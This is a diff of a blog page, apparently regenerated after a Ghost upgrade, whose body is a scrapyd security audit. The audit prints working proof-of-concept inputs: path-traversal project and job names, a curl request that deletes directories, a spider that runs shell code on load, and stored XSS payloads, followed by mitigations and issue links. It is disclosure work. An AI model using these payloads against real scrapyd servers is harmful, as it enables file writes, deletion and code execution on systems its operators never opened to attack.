@@ -1,3 +1,4 @@
+
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -11,10 +12,11 @@
     <link rel="shortcut icon" href="/favicon.ico">
 
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
-    <link rel="stylesheet" type="text/css" href="/assets/css/prism.css?v=9a2fb6892c">
-    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=9a2fb6892c">
+    <link rel="stylesheet" type="text/css" href="/assets/css/prism.css?v=8e59806e20">
+    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=8e59806e20">
     <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic%7COpen+Sans:700,400">
 
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
     <link rel="canonical" href="http://www.spect.cl/blog/2015/11/security-audit-scrapyd/">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <link rel="amphtml" href="http://www.spect.cl/blog/2015/11/security-audit-scrapyd/amp/">
@@ -48,7 +50,12 @@
     "publisher": {
         "@type": "Organization",
         "name": "SPECT Research",
-        "logo": "http://www.spect.cl/ghost/img/ghosticon.jpg"
+        "logo": {
+            "@type": "ImageObject",
+            "url": "http://www.spect.cl/favicon.ico",
+            "width": 16,
+            "height": 16
+        }
     },
     "author": {
         "@type": "Person",
@@ -70,12 +77,19 @@
     "description": "In this post I&#x27;ll write about the vulnerabilities discovered in scrapyd, the scrapy daemon. It&#x27;s a full review of security issues and measures to take in order to run scrapyd safely. Overview scrapyd is a Python project that offers a web API for scrapy project management. It&#x27;s quite simple, there&#x27;s",
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "http://www.spect.cl"
+        "@id": "http://www.spect.cl/"
     }
 }
     </script>
 
-    <meta name="generator" content="Ghost 0.11">
+    <script type="text/javascript" src="/public/ghost-sdk.min.js?v=8e59806e20"></script>
+<script type="text/javascript">
+ghost.init({
+	clientId: "ghost-frontend",
+	clientSecret: "56ef4883a9ca"
+});
+</script>
+    <meta name="generator" content="Ghost 1.16">
     <link rel="alternate" type="application/rss+xml" title="SPECT Research" href="http://www.spect.cl/rss/">
     <script>
 var disqus_shortname = 'spectresearch';
@@ -124,47 +138,31 @@ var ga_id = 'UA-18043187-1';
         </header>
 
         <section class="post-content">
-            <p>In this post I'll write about the vulnerabilities discovered in <a href="https://github.com/scrapy/scrapyd">scrapyd</a>, the <a href="http://scrapy.org">scrapy</a> daemon. It's a full review of security issues and measures to take in order to run <em>scrapyd</em> safely.</p>
-
+            <div class="kg-card-markdown"><p>In this post I'll write about the vulnerabilities discovered in <a href="https://github.com/scrapy/scrapyd">scrapyd</a>, the <a href="http://scrapy.org">scrapy</a> daemon. It's a full review of security issues and measures to take in order to run <em>scrapyd</em> safely.</p>
 <h4 id="overview">Overview</h4>
-
 <p><em>scrapyd</em> is a <em>Python</em> project that offers a web API for <em>scrapy</em> project management. It's quite simple, there's no users nor permissions schema, it runs <em>scrapy</em> spiders which are python files and yes, you could execute whatever you want. However, in this report I'll focus on the <em>API</em> side, website and some measures to mitigate potential scenarios.</p>
-
 <p>How it works? You have a <em>scrapy</em> project and <a href="https://scrapyd.readthedocs.org/en/latest/deploy.html">you can deploy it</a> to an <em>scrapyd</em> instance. The deployment process creates an <a href="https://pythonhosted.org/setuptools/formats.html">egg file</a> of your project and uploads it to the server running <em>scrapyd</em>. Then, you can schedule spider runs on the server.</p>
-
 <h2 id="vulnerabilities">Vulnerabilities</h2>
-
 <h4 id="1projectnameandeggstorageissues">1. Project name and egg storage issues</h4>
-
 <p>A malicious attacker could specify through <code>project</code> setting in <code>scrapy.cfg</code> the directory where to upload the egg file. It could be <strong>any</strong> directory (escaping from <code>eggs_dir</code> setting) where the user running <em>scrapyd</em> has write permissions.</p>
-
 <p>A malicious example:</p>
-
-<pre><code class="language- language-ini">[deploy]
-url = http://localhost:6800/  
-project = ../../../../../tmp/badname  
+<pre><code class="language-language-ini">[deploy]
+url = http://localhost:6800/
+project = ../../../../../tmp/badname
 </code></pre>
-
 <p>After running <code>scrapyd-deploy</code>, the egg will be uploaded to <code>/tmp/badname</code> directory. It's due to that <code>project</code> variable isn't sanitized neither in <code>website.AddVersion</code> nor <code>eggstorage.FilesystemEggStorage._eggpath</code> method.</p>
-
-<pre><code class="language- language-python">def _eggpath(self, project, version):  
+<pre><code class="language-language-python">def _eggpath(self, project, version):
     sanitized_version = re.sub(r'[^a-zA-Z0-9_-]', '_', version)
     x = path.join(self.basedir, project, "%s.egg" % sanitized_version)
     return x
 </code></pre>
-
 <p>As seen, <code>path.join</code> doesn't resolve directory traversal issues.</p>
-
 <h4 id="2wildcardasprojectvalue">2. Wildcard as project value</h4>
-
 <p>There's an <em>API</em> endpoint to list project versions, accepting as parameter the project name. However, you can provide wildcard character as <code>project</code> value and it will return the versions of every project.</p>
-
-<pre><code class="language- language-bash">curl http://localhost:6800/listversions.json?project=*  
+<pre><code class="language-language-bash">curl http://localhost:6800/listversions.json?project=*
 </code></pre>
-
 <p>It's due that the wildcard character has an special meaning in Python <code>glob.glob()</code> function, which is called to collect the project versions in  <code>eggstorage.FilesystemEggStorage.list</code>.</p>
-
-<pre><code class="language- language-python">def list(self, project):  
+<pre><code class="language-language-python">def list(self, project):
     eggdir = path.join(self.basedir, project)
     versions = [
         path.splitext(path.basename(x))[0]
@@ -172,33 +170,24 @@ project = ../../../../../tmp/badname
     ]
     return sorted(versions, key=LooseVersion)
 </code></pre>
-
 <p>I consider this a security issue in spite of the <em>scrapyd</em> nature (projects available to everyone). First, it's not expected behaviour and someone developing a system based on <em>scrapyd</em> would face unwanted data access if some malicious user has project names containing characters with shell meaning.</p>
-
 <h4 id="3arbitrarydirectorydeletion">3. Arbitrary directory deletion</h4>
-
 <p>When you call the delete project API endpoint, it doesn't sanitize the project name and similarly to the uploading issue, in this case you can delete <strong>any</strong> directory where the user running <em>scrapyd</em> is owner.</p>
-
 <p>In example, <code>scrapyd</code> user owns directory  <code>/tmp/test</code>. Making the next request, it will delete that directory.</p>
-
-<pre><code>curl http://localhost:6800/delproject.json  
+<pre><code>curl http://localhost:6800/delproject.json
 -d project=../../../../tmp/test
 </code></pre>
-
 <h4 id="4executingpythoncodewhencountingspiders">4. Executing python code when counting spiders</h4>
-
 <p>When you add a new project version through API endpoint <code>addversion.json</code> the response will include the count of the spiders in the project. To calculate this real-time count, <em>scrapyd</em> uses the function <code>scrapyd.utils.get_spider_list</code> to get the spider list and then <code>len(spider_list)</code> is returned.</p>
-
 <p>The issue is that <code>get_spider_list</code> calls <code>scrapy list</code> under the hood. After using <a href="http://scrapy.org">scrapy</a> for years, I already know that <code>scrapy list</code> creates the spider list by loading the spider modules to get the spider name. As you could guess, loading a python file executes their code at module level automatically. Below there's an example spider exploiting this fact.</p>
-
-<pre><code class="language- language-python"># -*- coding: utf-8 -*-
-import scrapy  
+<pre><code class="language-language-python"># -*- coding: utf-8 -*-
+import scrapy
 import commands
 
 commands.getstatusoutput('touch /tmp/test')
 
 
-class ExampleSpider(scrapy.Spider):  
+class ExampleSpider(scrapy.Spider):
     name = "example"
     allowed_domains = ["example.com"]
     start_urls = (
@@ -208,88 +197,62 @@ class ExampleSpider(scrapy.Spider):
     def parse(self, response):
         pass
 </code></pre>
-
 <p>Uploading a project with this spider will create a file in <code>/tmp/test</code> without need of running the spider. Technically, every logic using <code>get_spider_list</code> will be affected like <code>listspiders.json</code> and <code>schedule.json</code>.</p>
-
 <h4 id="5storedcrosssitescriptingat">5. Stored Cross Site Scripting at /</h4>
-
 <p>The home page (<code>http://localhost:6800/</code>) lists the available projects without escaping their names, so we could create a malicious project name to exploit it. A simple pattern like <code>&lt;script&gt;code&lt;/script&gt;</code> won't work since the slash has a path meaning when saving the project in the filesystem so it will raise an exception. However, there are many ways to exploit a <code>XSS</code> that setting the next example works great:</p>
-
-<pre><code class="language- language-ini">[deploy]
-url = http://localhost:6800/  
-project = &lt;img onerror=alert(1); src=x&gt;  
+<pre><code class="language-language-ini">[deploy]
+url = http://localhost:6800/
+project = &lt;img onerror=alert(1); src=x&gt;
 </code></pre>
-
-<p><img src="http://cdn.spect.cl/blog/posts/images/scrapyd_homepage_xss.png" style="height:400px; width:700px"></p>
-
+<img src="http://cdn.spect.cl/blog/posts/images/scrapyd_homepage_xss.png" style="height:400px; width:700px">
 <h4 id="6storedcrosssitescriptingatjobs">6. Stored Cross Site Scripting at /jobs</h4>
-
 <p>The jobs page (<code>http://localhost:6800/jobs</code>) lists the jobs summary without escaping project name, spider name and job id. Even project name isn't exploitable since a right payload generates exceptions when <em>scrapyd</em> tries to load the project, the other variables are useful to embed javascript code.</p>
-
 <p>Exploiting it through job id is as simple as sending a malicious value in <code>jobid</code> parameter to the schedule endpoint and then loading jobs page.</p>
-
-<pre><code class="language- ">curl http://localhost:6800/schedule.json  
+<pre><code>curl http://localhost:6800/schedule.json 
 -d project=test -d spider=example 
 -d jobid='&lt;script&gt;alert(1)&lt;/script&gt;'`
 </code></pre>
-
-<p><img src="http://cdn.spect.cl/blog/posts/images/scrapyd_jobs_jobid_xss.png" style="height:250px; width:625px"></p>
-
+<img src="http://cdn.spect.cl/blog/posts/images/scrapyd_jobs_jobid_xss.png" style="height:250px; width:625px">
 <p>To exploit spider name is required to have a spider with the payload as name, like in this snippet:</p>
-
-<pre><code class="language- language-python">class ExampleSpider(scrapy.Spider):  
+<pre><code class="language-language-python">class ExampleSpider(scrapy.Spider):
     name = "&lt;script&gt;alert(1)&lt;/script&gt;"
 </code></pre>
-
 <p>So, sending the request with a malicious value in <code>spider</code> parameter and then loading the jobs page shows the alert pop-up.</p>
-
-<pre><code class="language- ">curl http://localhost:6800/schedule.json  
+<pre><code>curl http://localhost:6800/schedule.json 
 -d project=test -d spider='&lt;script&gt;alert(1)&lt;/script&gt;'
 </code></pre>
-
-<p><img src="http://cdn.spect.cl/blog/posts/images/scrapyd_jobs_spider_name_xss.png" style="height:250px; width:625px"></p>
-
+<img src="http://cdn.spect.cl/blog/posts/images/scrapyd_jobs_spider_name_xss.png" style="height:250px; width:625px">
 <h4 id="7jobidandspidernamecausingdirectorytraversal">7. Job id and spider name causing directory traversal</h4>
-
 <p>Creating a malicious spider name:</p>
-
-<pre><code class="language- language-python">class ExampleSpider(scrapy.Spider):  
+<pre><code class="language-language-python">class ExampleSpider(scrapy.Spider):
     name = "../../../../../tmp/spider"
 </code></pre>
-
 <p>and then scheduling it will save the jobs log and data in <em>any</em> directory where the user running <em>scrapyd</em> has write permissions. The log of <em>scrapyd</em> clearly shows it:</p>
-
-<pre><code>2015-11-07 11:11:17+0000 [-] Process started:  project='test' spider='../../../../../tmp/spider' job='41bb4228854011e58aa00242ac110002' pid=86 log='logs/test/../../../../../tmp/spider/41bb4228854011e58aa00242ac110002.log' items='file:///tmp/spider/41bb4228854011e58aa00242ac110002.jl'  
+<pre><code>2015-11-07 11:11:17+0000 [-] Process started:  project='test' spider='../../../../../tmp/spider' job='41bb4228854011e58aa00242ac110002' pid=86 log='logs/test/../../../../../tmp/spider/41bb4228854011e58aa00242ac110002.log' items='file:///tmp/spider/41bb4228854011e58aa00242ac110002.jl'
 </code></pre>
-
 <p>The same can be achieved with a malicious <code>jobid</code> argument that contains a directory traversal pattern:</p>
-
 <pre><code>$ curl http://localhost:6800/schedule.json -d project=test -d spider=spider -d jobid="../../../../../tmp/myjob"
 </code></pre>
-
 <p>And the <em>scrapyd</em> log shows:</p>
-
-<pre><code>2015-11-07 11:22:47+0000 [-] Process started:  project='test' spider='spider' job='../../../../../tmp/myjob' pid=104 log='logs/test/spider/../../../../../tmp/myjob.log' items='file:///tmp/myjob.jl'  
+<pre><code>2015-11-07 11:22:47+0000 [-] Process started:  project='test' spider='spider' job='../../../../../tmp/myjob' pid=104 log='logs/test/spider/../../../../../tmp/myjob.log' items='file:///tmp/myjob.jl'
 </code></pre>
-
 <h2 id="measures">Measures</h2>
-
 <h4 id="runningconditions">Running conditions</h4>
-
 <p><em>scrapyd</em> runs without any authentication, listen to <strong>any</strong> <em>IP</em> and allows to execute <em>Python</em> code in the machine running it. In short terms, it's an open remote terminal. Some attacker could scan the network looking for <em>TCP</em> port 6800 (used by default) and quickly deploy a spider that executes a reverse shell. There are two ways to prevent it:</p>
-
 <ul>
-<li><p>Listen only to <code>localhost</code> meeting the same threats as running a debug tool of current web frameworks like <a href="https://pypi.python.org/pypi/django-debug-toolbar">django-debug-toolbar</a>.</p></li>
-<li><p>Implement Basic authentication by default, which forces the user to set a password at least.</p></li>
+<li>
+<p>Listen only to <code>localhost</code> meeting the same threats as running a debug tool of current web frameworks like <a href="https://pypi.python.org/pypi/django-debug-toolbar">django-debug-toolbar</a>.</p>
+</li>
+<li>
+<p>Implement Basic authentication by default, which forces the user to set a password at least.</p>
+</li>
 </ul>
-
 <h2 id="fixes">Fixes</h2>
-
 <p>I've opened some issues in <a href="https://github.com/scrapy/scrapyd/issues">scrapyd issue tracker</a> to solve the exposed vulnerabilities. I have some ideas about fixing the issues but certainly it's better to have some feedback on them. To track the progress, the issues are:</p>
-
 <ul>
 <li><a href="https://github.com/scrapy/scrapyd/issues/117">Project name sanitization</a></li>
 </ul>
+</div>
         </section>
 
         <footer class="post-footer">
@@ -359,7 +322,7 @@ project = &lt;img onerror=alert(1); src=x&gt;
 
 
         <footer class="site-footer clearfix">
-            <section class="copyright"><a href="http://www.spect.cl">SPECT Research</a> © 2016</section>
+            <section class="copyright"><a href="http://www.spect.cl">SPECT Research</a> © 2017</section>
         </footer>
 
     </div>
@@ -378,9 +341,9 @@ project = &lt;img onerror=alert(1); src=x&gt;
   }
 </script>
 
-    <script type="text/javascript" src="/assets/js/prism.js?v=9a2fb6892c"></script>
-    <script type="text/javascript" src="/assets/js/jquery.fitvids.js?v=9a2fb6892c"></script>
-    <script type="text/javascript" src="/assets/js/index.js?v=9a2fb6892c"></script>
+    <script type="text/javascript" src="/assets/js/prism.js?v=8e59806e20"></script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js?v=8e59806e20"></script>
+    <script type="text/javascript" src="/assets/js/index.js?v=8e59806e20"></script>
 
 
 </body>
